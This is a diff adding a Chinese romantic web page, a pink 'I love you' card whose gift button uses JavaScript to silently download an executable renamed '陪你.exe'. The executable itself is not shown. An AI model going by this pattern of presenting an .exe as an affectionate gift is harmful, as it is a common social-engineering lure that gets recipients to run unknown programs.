@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>我爱你</title>
+    <style>
+        body {
+            background-color: #ffe6e6;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            background-color: white;
+            border-radius: 15px;
+            padding: 40px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            animation: fadeIn 1s;
+        }
+        h1 {
+            color: #ff4d4d;
+            font-size: 3em;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 1.5em;
+            color: #666;
+        }
+        .heart {
+            font-size: 50px;
+            color: #ff4d4d;
+            animation: heartbeat 1s infinite;
+        }
+        @keyframes heartbeat {
+            0%, 100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.2);
+            }
+        }
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+        .button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #ff4d4d;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 1.2em;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .button:hover {
+            background-color: #ff1a1a;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>我爱你 ❤️</h1>
+        <p>你是我心中最美的风景</p>
+        <div class="heart">💖</div>
+        <button class="button" onclick="downloadFile()">宝子的跨年礼物</button>
+    </div>
+
+    <script>
+        function downloadFile() {
+            // 创建一个隐藏的链接
+            const link = document.createElement('a');
+            link.href = '新年礼物/我会一直陪着你.exe'; // 替换为你的文件路径
+            link.download = '陪你.exe'; // 指定下载的文件名
+            document.body.appendChild(link);
+            link.click(); // 模拟点击
+            document.body.removeChild(link); // 移除链接
+        }
+    </script>
+</body>
+</html>
+
